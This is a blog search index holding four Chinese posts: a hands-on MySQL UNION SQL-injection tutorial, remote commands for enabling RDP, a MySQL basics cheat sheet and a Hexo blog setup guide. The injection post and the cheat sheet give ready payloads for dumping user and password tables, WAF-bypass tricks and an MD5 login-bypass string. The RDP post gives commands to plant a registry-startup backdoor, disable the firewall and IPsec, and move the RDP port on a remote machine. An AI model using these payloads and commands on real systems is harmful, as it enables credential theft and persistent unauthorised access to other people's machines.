<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[MySQL手工联合查询注入]]></title>
    <url>%2F2017%2F08%2F26%2FMySQLUnionInjection%2F</url>
    <content type="text"><![CDATA[内容如题 PHP+MySQL简单手工注入基本流程一、判断是否存在注入1234567891011SQL注入按类型分为两种：数字型和字符型判断方法的区别：字符型用&apos;判断，数字型用and 1=1 和and 1=2判断注释方法：# 编码后为%23，hash语法-- s 后跟空格后面随意写字符，又例：--+-- - SQL语法;%00 可以使用，空字节/* 必须闭合，C-style语法 · 反引号（左上角的字符） 判断sql注入（显错和基于错误的盲注）：单引号，and 1=1 和and 1=2，双引号，反斜杠，注释等 判断基于时间的盲注:在上面的基础上，加个sleep函数 ，如sleep(5) (函数不同数据库有所不同)例子： &apos; and sleep(5) &quot; and sleep(5) 二、判断有几列数据1234567891011121314151617order by 1 #一直到出现错误为止and 1=2 union select 1,2 #一直到成功为止，一般页面会出现显示位，出现显示位的地方可以放我们想要放的东西，例如：user(),database(),@@version，则会在显示位出现连接的用户、数据库、版本等信息可以放的东西：database(),schema() #数据库名user(),current_user(),current_user,system_user(),session_user() #用户@域名@@version,version(),@@global.version #mysql版本信息@@basedir #mysql安装路径@@datadir #数据库存放路径@@hostname #主机名@@version_compile_os; #操作系统指纹@@global.version_compile_os #感觉和上面差不多now() #当前时间：年月日时分秒current_date #当前时间：年月日char() #指定字符load_file() #读取指定文件ord(mid(user(),1,1))=114 #系统权限，正常返回说明为root小工具：火狐F9——》SQL——》union select statement——》输入数字，直接出现联合查询，方便爆出列数 三、得到数据库名1234561、使用database()直接得到当前数据库名2.1 如果database()被过滤，则使用union select 1,schema_name,3,4,5,6 from information_schema.schemata limit 0,1 查看数据库名，可以通过Limit设置显示第几行，也就可以显示其他的数据库名。根据数据库名爆表名（如果database()）被过滤 2.2 UNION SELECT 1,group_concat(schema_name),3,database(),5,6 from information_schema.schemata 显示所有数据库名，函数group_concat是显示所有 2.3 UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE version=10; MySQL 4版本时用version=9，MySQL 5版本时用version=10 Mysql 5 以上有内置库 information_schema，存储着mysql的所有数据库和表结构信息 四、得到表名1231、UNION SELECT 1,table_name,3,4,5,6 from information_schema.tables where table_schema=&apos;s10&apos; limit 0,1 #显示s10数据库的表名，一个一个来2、union select 1,group_concat(table_name),3,4,5,6 from information_schema.tables where table_schema=&apos;s10&apos; #显示s10数据库的表名，全部显示3、SELECT table_name FROM information_schema.tables WHERE table_name LIKE &apos;%user%&apos; #查询包含user的表 五、得到列名12341、UNION SELECT 1,2,3,database(),5,column_name from information_schema.columns where table_schema=&apos;s10&apos; and table_name=&apos;users&apos; limit 0,1 #查询列名，一个一个来2、union select 1,2,3,4,5,group_concat(column_name) from information_schema.columns where table_schema=&apos;s10&apos; and table_name=&apos;users&apos; #查询列名，一次全部显示3、SELECT column_name FROM information_schema.columns WHERE table_name LIKE &apos;%user%&apos; #查询包含user的列4、SELECT username, permission FROM Users WHERE id = 1; 1 PROCEDURE ANALYSE() 获得第一个段名 1 LIMIT 1,1 PROCEDURE ANALYSE() 获得第二个段名 1 LIMIT 2,1 PROCEDURE ANALYSE() 获得第三个段名 #这个需要web展示页面有你所注入查询的一个字段。 六、得到想要的数据1231、union select 1,username,password,4,5,6 from users; #在不同的显示位显示需要的内容2、union select 1,concat(userename,0x23,password),3,4,5,6 from users; #函数concat可以联合显示数据，0x23是分隔符3、union select 1,concat_ws(0x23,username,email,age,password),3,4,5,6 from users #函数concat_ws只写一次分隔符即可]]></content>
      <categories>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>联合查询</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[开启3389命令]]></title>
    <url>%2F2017%2F08%2F26%2Fopen3389%2F</url>
    <content type="text"><![CDATA[远程cmd开启3389，以及开启成功依旧不能登录的解决方法 开启命令：12345678910111213141516正常命令：REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f远程使用时，需要变为双斜杠：REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f查看远程连接端口号REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server\WinStations\RDP-Tcp /v PortNumber添加后门：Reg enumkey –k HKLM\\software\\microsoft\\windows\\currentVersion\\run 查看注册表的自启动项Reg setval –k 注册表路径 –v 文件名 –d “文件路径” 将后门添加到注册表启动项关闭TCP/IP端口筛选 (需重启) tcp/ip筛选是让用户设置电脑的可接收和不能接收的TCP/IP端口，保证安全REG ADD HKLM\SYSTEM\ControlSet001\Services\Tcpip\parameters /v EnableSecurityFilters /t REG_DWORD /d 0 /f更改终端端口为3800(0x0ED8)REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server\Wds\rdpwd\Tds\tcp /v PortNumber /t REG_DWORD /d 0x0ED8 /fREG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server\WinStations\RDP-Tcp /v PortNumber /t REG_DWORD /d 0x0ED8 /f 开启失败可以尝试：关闭ip安全策略： 1cmd /c net stop policyagent 将IPSEC Services服务停了 防火墙相关： 12345678910111213141516查看防火墙状态：netsh firewall show state禁用防火墙（以管理员运行）：netsh firewall set opmode disable启用防火墙：netsh firewall set opmode enable防火墙重置：netsh advfirewall reset允许文件和打印共享 ：netsh firewall add portopening UDP 137 Netbios-ns (允许客户端访问服务器UDP协议的137端口) netsh firewall add portopening UDP 138 Netbios-dgm (允许访问UDP协议的138端口) netsh firewall add portopening TCP 139 Netbios-ssn (允许访问TCP协议的139端口) netsh firewall add portopening TCP 445 Netbios-ds (允许访问TCP协议的445端口) 添加3389对外开放规则：netsh firewall set portopening TCP 3389 ENABLE 允许netsh firewall set portopening TCP 3389 DISABLE 禁止]]></content>
      <categories>
        <category>3389</category>
      </categories>
      <tags>
        <tag>3389</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MySQL数据库基础学习]]></title>
    <url>%2F2017%2F08%2F26%2Fmysql-basic%2F</url>
    <content type="text"><![CDATA[罗列了一些MySQL的常用语句命令，可以进来看看1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586select user,host,password from mysql,user #查看mysql的用户和密码mysql -hlocalhost -uroot -p #连接数据库show databases; #显示数据库select database(); #显示当前使用的数据库select user(); #显示当前用户select version(): 或者select @@version; #显示版本use 数据库名; #选择数据库select @@basedir; #显示mysql安装路径select @@datadir; #显示数据库存放的路径select @@hostname; #显示主机名select @@version_compile_os; #显示mysql操作系统版本select now(); #显示当前时间create database 数据库名 character set utf8; #创建数据库drop database 数据库名; #删除数据库create table users(id int(10) unsigned not null primary key auto_increment, username varchar(30) not null, email varchar(30) not null, password varchar(32) not null)default charset=utf8; #创建表（id是无符号整数类型）create table me like users; #创建表me，结构与users表一致show tables; #查看表desc users; #查看表结构insert into users(username,email,password) values('admin','1','123'); #插入表数据select hex('admin') #查看admin字符的16进制，使用时前面加上0x，例：select * from users where user=0x61646d696e;select * from users limit 2; #查询前两条信息select * from users limit 2,2; #查询第三条和第四条两条（从第三条开始，查询两条）select * from users where username like '%admin%'; #查询用户名包含admin的所有信息（这里的%是like查询中的通配符，用来匹配所有字符，所以用户名中包含admin的全部都能显示出来）select * from users where username='admin'; #查询用户名是admin的信息update users set username='admin' where id=1; #修改id为1的用户名为admindelete from users where id=12; #删除id为12的数据select * from users where id=1 union select * from users where id=3; #联合查询，可以查询多条，要求各边查询的列数一致select * from users order by 1; #根据第一列排序（可以以此为查询列数的依据）select * from users where id=-1 union select 1,2,user(),4; #联合查询，只显示后面的查询结果，前面的查询结果为空，所以不显示select * from users where id=1 and 1=2 union select 1,2,user(),4; #同上create table ec_users(id int(10) primary key auto_increment,username varchar(32) not null,count_tmp float not null,dept varchar(32) not null)default charset=utf8; #创建表select dept,count(*) from ec_users where count_tmp&gt;=90 group by dept having count(dept)&gt;1; #统计每个部门成绩大于90的人数select DISTINCT username from ec_users; #distinct用来去除重复数据select all dept from ec_users #all表示查询所有（默认为all，重复的也显示）select * from ec_users where dept is null #查询部门值为空select * from ec_users where dept is not null #查询部门值不为空select * from ec_users where id BETWEEN 3 and 5 #查询id为3~5之间的数据select * from ec_users where id in(1,2,6) #查询id值为1,2,6的数据（过waf有用）select * from ec_users where id=1 or 'a' in ('b','a'); #过waf用，后面恒为真，'a'字符存在在in('a')里select * from ec_users where id=1 &amp;&amp; id&lt;3; #查询id=1且id&lt;3的select * from ec_users where id=1 | id&lt;3; #过waf用一个|或一个&amp;可以显示select * from ec_users where id xor 0; #异或，两个均为真显示0，两个不同为1select * from ec_users where id not in(1,2,3) #not与！是一个用处，可以用在in、likealter table users add age int(3) not null; #添加列alter table users modify age int(4) #修改列的数据类型为int(4)alter table users change age age int(3) #同上，也是修改列的数据类型，只是需要写两次列名alter table users rename ress; #修改表名alter table users rename as ress; #同上，也是修改表名select count(*) from information_schema.tables #返回系统表里的数据个数select rand() #返回0~1之间的随机浮点数select rand()*4 #返回0~4之间的随机浮点数select floor(rand()*4) #随机生成0~4（不可能是4）之间的整数 select floor(rand()*4）as dumb #并命名为dumb列（as可省略）#if用法：select if (判断条件,'语句1','语句2') #条件为真执行语句1，条件为假执行语句2#十六进制：SELECT 0x5045 #(这不是一个整数，而会是一个16进制字符串）SELECT 0x50 + 0x45 #(现在这是整数了)select concat('0x',hex('c:\\boot.ini')) #另类的使用十六进制方式#字符串的串联|| 仅在ANSI模式下的MySQL执行，其他情况下都会当成逻辑操作符并返回0，建议使用下面函数concat() concat_ws() group_concat()#绕过MD5哈希检查的例子用户名：admin密码：1234 ' AND 1=0 UNION ALL SELECT 'admin','81dc9bdb52d04dc20036dbd8313ed055其中81dc9bdb52d04dc20036dbd8313ed055 = MD5(1234)grant 权限1,权限2...,权限n on 数据库名.表名 to 用户名@用户地址 identified by '连接口令'； 赋给用户权限,权限被all privileges或all替代，表示赋给用户全部权限；数据库名.表名被*替代，表示赋给用户操作服务器上所有数据库所有表的权限；用户地址可以使ip地址、机器名、域名，也可以用%表示从任何地址连接；连接口令不能为空，否则创建失败；后面可以加with grant option对象授权，权限传递（我也不懂，就是这么说的）例： GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' IDENTIFIED BY '123456' WITH GRANT OPTION; flush privileges; #刷新系统权限表show variables like "secure_file_priv" #查看可写目录]]></content>
      <categories>
        <category>MySQL</category>
      </categories>
      <tags>
        <tag>MySQL基础</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Ubuntu+hexo+Github博客简单搭建流程]]></title>
    <url>%2F2017%2F08%2F25%2Fblog-step%2F</url>
    <content type="text"><![CDATA[自己博客的基本搭建流程，不包含主题的美化 搭建开始1、安装nodejs1234curl -sL https://deb.nodesource.com/setup_4.x | sudo -E bash -sudo apt-get install -y nodejsnode -v #检查版本v 4.4.5 2、安装git123apt-get install gitgit --version #检查版本git version 2.7.4 3、安装npm1apt-get install npm 4、使用npm安装hexo1npm install -g hexo-cli 5、创建一个博客文件夹，进入文件夹中1234hexo initnpm installhexo -v #此时博客已经创建成功hexo server #看看效果把（浏览器中输入：ip:4000，如果4000端口被占用，hexo server -p 其他端口） 6、创建一个github账户，新建一个和用户名对应的仓库，格式固定：用户名.github.io 7、修改站点配置文件_config.yml123456language: zh-Hans 设置成中文deploy: type: git repository: git@github.com:maplege/maplege.github.io.git branch: master message: '站点更新:&#123;&#123;now("YYYY-MM-DD HH:mm:ss")&#125;&#125;' 8、然后执行下面的命令1npm install hexo-deployer-git --save 9、生成SSH密钥123$ cd ~/. ssh #检查本机已存在的ssh密钥如果提示：No such file or directory 说明你是第一次使用git。ssh-keygen -t rsa -C "邮件地址" 然后连续3次回车，最终会生成一个文件在用户目录下，打开用户目录，找到.ssh\id_rsa.pub文件，记事本打开并复制里面的内容，打开你的github主页，进入个人设置 -&gt; Deploy keys -&gt; Add deploy key：将刚复制的内容粘贴到key那里，title随便填，保存。 10、进行git全局配置12git config --global user.email "you@example.com"git config --global user.name "Your Name" 11、上传到github空间中123hexo cleanhexo ghexo d 至此，博客搭建完毕]]></content>
      <categories>
        <category>博客</category>
      </categories>
      <tags>
        <tag>博客搭建</tag>
      </tags>
  </entry>
</search>
